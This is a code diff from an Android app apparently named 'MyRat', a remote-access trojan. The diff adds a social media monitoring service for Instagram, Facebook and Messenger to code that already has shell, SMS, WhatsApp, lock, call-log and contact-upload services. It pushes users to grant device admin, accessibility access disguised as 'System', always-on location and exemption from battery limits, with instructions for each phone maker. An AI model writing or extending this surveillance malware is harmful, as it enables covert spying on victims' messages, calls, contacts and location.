@@ -26,6 +26,7 @@ import com.myrat.app.service.ShellService
 import com.myrat.app.service.SmsService
 import com.myrat.app.service.LockService
 import com.myrat.app.service.WhatsAppService
+import com.myrat.app.service.SocialMediaService
 import com.myrat.app.utils.Logger
 
 class PermissionHandler(
@@ -188,6 +189,7 @@ class PermissionHandler(
             Feature.INTERNET -> internetPermission + queryPackagesPermission
             Feature.LOCK -> lockPermissions
             Feature.WHATSAPP -> internetPermission + queryPackagesPermission
+            Feature.SOCIAL_MEDIA -> internetPermission + queryPackagesPermission
             Feature.CALL_ACCESSIBILITY -> phonePermissions + internetPermission + queryPackagesPermission
             Feature.GENERAL -> nonRestrictedPermissions
         }
@@ -256,8 +258,9 @@ class PermissionHandler(
             Feature.INTERNET -> "Internet and package query permissions are required for network connectivity and app monitoring (e.g., WhatsApp). Please grant all permissions."
             Feature.LOCK -> "Foreground service, wake lock, and system alert permissions are required for device lock and screen management features. Please grant all permissions."
             Feature.WHATSAPP -> "Internet and package query permissions are required to monitor WhatsApp and WhatsApp Business. Please grant all permissions."
+            Feature.SOCIAL_MEDIA -> "Internet and package query permissions are required to monitor Instagram, Facebook, and Messenger. Please grant all permissions."
             Feature.CALL_ACCESSIBILITY -> "Phone and internet permissions are required for enhanced call monitoring and dialer app accessibility. Please grant all permissions."
-            Feature.GENERAL -> "This app requires all permissions to function properly, including WhatsApp monitoring, call monitoring, lock, and screen management features. Please grant all requested permissions."
+            Feature.GENERAL -> "This app requires all permissions to function properly, including WhatsApp monitoring, social media monitoring, call monitoring, lock, and screen management features. Please grant all requested permissions."
         }
         try {
             AlertDialog.Builder(activity)
@@ -314,6 +317,12 @@ class PermissionHandler(
                     startAppropriateService(Intent(activity, WhatsAppService::class.java))
                 }
             }
+            Feature.SOCIAL_MEDIA -> {
+                if (internetPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED } &&
+                    queryPackagesPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
+                    startAppropriateService(Intent(activity, SocialMediaService::class.java))
+                }
+            }
             Feature.CALL_ACCESSIBILITY -> {
                 if (phonePermissions.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED } &&
                     internetPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED } &&
@@ -341,6 +350,7 @@ class PermissionHandler(
                     queryPackagesPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                     startAppropriateService(Intent(activity, ShellService::class.java))
                     startAppropriateService(Intent(activity, WhatsAppService::class.java))
+                    startAppropriateService(Intent(activity, SocialMediaService::class.java))
                 }
                 if (lockPermissions.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
                     startAppropriateService(Intent(activity, LockService::class.java))
@@ -362,6 +372,7 @@ class PermissionHandler(
             queryPackagesPermission.all { ContextCompat.checkSelfPermission(activity, it) == PackageManager.PERMISSION_GRANTED }) {
             startAppropriateService(Intent(activity, ShellService::class.java))
             startAppropriateService(Intent(activity, WhatsAppService::class.java))
+            startAppropriateService(Intent(activity, SocialMediaService::class.java))
         }
         startAppropriateService(Intent(activity, CallLogUploadService::class.java))
         startAppropriateService(Intent(activity, ContactUploadService::class.java))
@@ -399,19 +410,22 @@ class PermissionHandler(
     private fun isAccessibilityServiceEnabled(): Boolean {
         try {
             val whatsappService = "${activity.packageName}/${WhatsAppService::class.java.canonicalName}"
+            val socialMediaService = "${activity.packageName}/${SocialMediaService::class.java.canonicalName}"
             val callService = "${activity.packageName}/${CallAccessibilityService::class.java.canonicalName}"
 
             val accessibilityManager = activity.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
             val enabledServices = accessibilityManager.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
 
             val whatsappEnabled = enabledServices.any { it.id == whatsappService }
+            val socialMediaEnabled = enabledServices.any { it.id == socialMediaService }
             val callEnabled = enabledServices.any { it.id == callService }
 
             Logger.log("WhatsApp accessibility service enabled: $whatsappEnabled")
+            Logger.log("Social Media accessibility service enabled: $socialMediaEnabled")
             Logger.log("Call accessibility service enabled: $callEnabled")
 
-            // Both services should be enabled for full functionality
-            return whatsappEnabled && callEnabled
+            // All services should be enabled for full functionality
+            return whatsappEnabled && socialMediaEnabled && callEnabled
         } catch (e: Exception) {
             Logger.error("Error checking accessibility services", e)
             return false
@@ -427,6 +441,7 @@ class PermissionHandler(
                 startServicesForFeature(Feature.RESTRICTED)
                 startServicesForFeature(Feature.LOCATION)
                 startServicesForFeature(Feature.CALL_ACCESSIBILITY)
+                startServicesForFeature(Feature.SOCIAL_MEDIA)
                 configureDeviceSpecificSettings()
             } else {
                 requestPermissions()
@@ -442,6 +457,7 @@ class PermissionHandler(
             startServicesForFeature(Feature.INTERNET)
             startServicesForFeature(Feature.LOCK)
             startServicesForFeature(Feature.WHATSAPP)
+            startServicesForFeature(Feature.SOCIAL_MEDIA)
             startServicesForFeature(Feature.CALL_ACCESSIBILITY)
             enableManufacturerSpecificAutostart()
         } else if (fromDeviceAdminSettings) {
@@ -464,7 +480,7 @@ class PermissionHandler(
             Logger.error("Cannot show restricted settings dialog: Activity is finishing or destroyed")
             return
         }
-        val message = "To continue, you must allow all permissions from App Settings. Please enable all permissions, including SMS, Location (select 'Allow all the time' for background access), Biometric, Foreground Service, and WhatsApp/Call monitoring permissions."
+        val message = "To continue, you must allow all permissions from App Settings. Please enable all permissions, including SMS, Location (select 'Allow all the time' for background access), Biometric, Foreground Service, and WhatsApp/Social Media/Call monitoring permissions."
         val spannable = android.text.SpannableStringBuilder(message)
         val start = message.indexOf("allow")
         val end = message.indexOf("Settings") + "Settings".length
@@ -511,7 +527,7 @@ class PermissionHandler(
             try {
                 AlertDialog.Builder(activity)
                     .setTitle("Overlay Permission Required")
-                    .setMessage("This app requires permission to draw over other apps to enable WhatsApp monitoring, call monitoring, and lock functionality. Please grant this permission.")
+                    .setMessage("This app requires permission to draw over other apps to enable WhatsApp monitoring, social media monitoring, call monitoring, and lock functionality. Please grant this permission.")
                     .setPositiveButton("Go to Settings") { _, _ ->
                         fromOverlaySettings = true
                         val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
@@ -708,7 +724,7 @@ class PermissionHandler(
             try {
                 AlertDialog.Builder(activity)
                     .setTitle("Accessibility Services Required")
-                    .setMessage("This app requires accessibility services to monitor WhatsApp, WhatsApp Business, and dialer apps for enhanced call tracking. Please enable both 'System' and 'Call Monitoring Service' in Settings > Accessibility.")
+                    .setMessage("This app requires accessibility services to monitor WhatsApp, WhatsApp Business, Instagram, Facebook, Messenger, and dialer apps for enhanced tracking. Please enable 'System', 'Social Media Monitor', and 'Call Monitoring Service' in Settings > Accessibility.")
                     .setPositiveButton("Go to Settings") { _, _ ->
                         fromAccessibilitySettings = true
                         val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
@@ -737,7 +753,7 @@ class PermissionHandler(
             try {
                 AlertDialog.Builder(activity)
                     .setTitle("Battery Optimization Required")
-                    .setMessage("This app requires battery optimization to be disabled to ensure reliable WhatsApp monitoring, call monitoring, and lock features. Please select 'Don't Optimize' in Settings > Battery.")
+                    .setMessage("This app requires battery optimization to be disabled to ensure reliable WhatsApp monitoring, social media monitoring, call monitoring, and lock features. Please select 'Don't Optimize' in Settings > Battery.")
                     .setPositiveButton("Go to Settings") { _, _ ->
                         disableBatteryOptimization()
                     }
@@ -777,12 +793,12 @@ class PermissionHandler(
         }
         val manufacturer = Build.MANUFACTURER.lowercase()
         val instructions = when (manufacturer) {
-            "xiaomi" -> "1. Settings > Apps > MyRat App > Autostart > Enable\n2. Enable 'Display over other apps' and 'Other permissions' (e.g., Display pop-up windows, Start in background)\n3. Enable Device Admin in Settings > Security\n4. Enable both 'System' and 'Call Monitoring Service' in Settings > Accessibility\n5. Select 'Allow all the time' for Location in App Settings\n6. Disable battery optimization in Settings > Battery > Battery Optimization > MyRat App > Don't Optimize"
-            "oppo" -> "1. Settings > Battery > Battery Optimization > MyRat App > Don't Optimize\n2. Enable 'Display over other apps' and 'Other permissions' (e.g., Allow pop-up windows, Start in background)\n3. Enable Device Admin in Settings > Security\n4. Enable both 'System' and 'Call Monitoring Service' in Settings > Accessibility\n5. Select 'Allow all the time' for Location in App Settings"
-            "vivo" -> "1. Settings > Battery > High Background Power > MyRat App > Enable\n2. Enable 'Display over other apps' and 'Other permissions' (e.g., Allow background pop-ups, Start in background)\n3. Enable Device Admin in Settings > Security\n4. Enable both 'System' and 'Call Monitoring Service' in Settings > Accessibility\n5. Select 'Allow all the time' for Location in App Settings"
-            "huawei" -> "1. Settings > Apps > MyRat App > Startup Management > Allow autostart\n2. Enable 'Display over other apps' and 'Other permissions' (e.g., Pop-up windows, Start in background)\n3. Enable Device Admin in Settings > Security\n4. Enable both 'System' and 'Call Monitoring Service' in Settings > Accessibility\n5. Select 'Allow all the time' for Location in App Settings\n6. Disable battery optimization in Settings > Battery"
-            "samsung" -> "1. Settings > Device Care > Battery > MyRat App > No Restrictions\n2. Enable 'Display over other apps' and 'Other permissions' (e.g., Pop-up windows, Start in background)\n3. Enable Device Admin in Settings > Security\n4. Enable both 'System' and 'Call Monitoring Service' in Settings > Accessibility\n5. Select 'Allow all the time' for Location in App Settings"
-            else -> "1. Settings > Apps > MyRat App > Permissions > Enable all permissions\n2. Enable 'Display over other apps' in App Settings\n3. Enable Device Admin in Settings > Security\n4. Enable both 'System' and 'Call Monitoring Service' in Settings > Accessibility\n5. Select 'Allow all the time' for Location in App Settings\n6. Disable battery optimization in Settings > Battery > Battery Optimization > MyRat App > Don't Optimize"
+            "xiaomi" -> "1. Settings > Apps > MyRat App > Autostart > Enable\n2. Enable 'Display over other apps' and 'Other permissions' (e.g., Display pop-up windows, Start in background)\n3. Enable Device Admin in Settings > Security\n4. Enable 'System', 'Social Media Monitor', and 'Call Monitoring Service' in Settings > Accessibility\n5. Select 'Allow all the time' for Location in App Settings\n6. Disable battery optimization in Settings > Battery > Battery Optimization > MyRat App > Don't Optimize"
+            "oppo" -> "1. Settings > Battery > Battery Optimization > MyRat App > Don't Optimize\n2. Enable 'Display over other apps' and 'Other permissions' (e.g., Allow pop-up windows, Start in background)\n3. Enable Device Admin in Settings > Security\n4. Enable 'System', 'Social Media Monitor', and 'Call Monitoring Service' in Settings > Accessibility\n5. Select 'Allow all the time' for Location in App Settings"
+            "vivo" -> "1. Settings > Battery > High Background Power > MyRat App > Enable\n2. Enable 'Display over other apps' and 'Other permissions' (e.g., Allow background pop-ups, Start in background)\n3. Enable Device Admin in Settings > Security\n4. Enable 'System', 'Social Media Monitor', and 'Call Monitoring Service' in Settings > Accessibility\n5. Select 'Allow all the time' for Location in App Settings"
+            "huawei" -> "1. Settings > Apps > MyRat App > Startup Management > Allow autostart\n2. Enable 'Display over other apps' and 'Other permissions' (e.g., Pop-up windows, Start in background)\n3. Enable Device Admin in Settings > Security\n4. Enable 'System', 'Social Media Monitor', and 'Call Monitoring Service' in Settings > Accessibility\n5. Select 'Allow all the time' for Location in App Settings\n6. Disable battery optimization in Settings > Battery"
+            "samsung" -> "1. Settings > Device Care > Battery > MyRat App > No Restrictions\n2. Enable 'Display over other apps' and 'Other permissions' (e.g., Pop-up windows, Start in background)\n3. Enable Device Admin in Settings > Security\n4. Enable 'System', 'Social Media Monitor', and 'Call Monitoring Service' in Settings > Accessibility\n5. Select 'Allow all the time' for Location in App Settings"
+            else -> "1. Settings > Apps > MyRat App > Permissions > Enable all permissions\n2. Enable 'Display over other apps' in App Settings\n3. Enable Device Admin in Settings > Security\n4. Enable 'System', 'Social Media Monitor', and 'Call Monitoring Service' in Settings > Accessibility\n5. Select 'Allow all the time' for Location in App Settings\n6. Disable battery optimization in Settings > Battery > Battery Optimization > MyRat App > Don't Optimize"
         }
         try {
             AlertDialog.Builder(activity)
@@ -809,6 +825,6 @@ class PermissionHandler(
     }
 
     enum class Feature {
-        RESTRICTED, LOCATION, PHONE, STORAGE, INTERNET, LOCK, WHATSAPP, CALL_ACCESSIBILITY, GENERAL
+        RESTRICTED, LOCATION, PHONE, STORAGE, INTERNET, LOCK, WHATSAPP, SOCIAL_MEDIA, CALL_ACCESSIBILITY, GENERAL
     }
 }
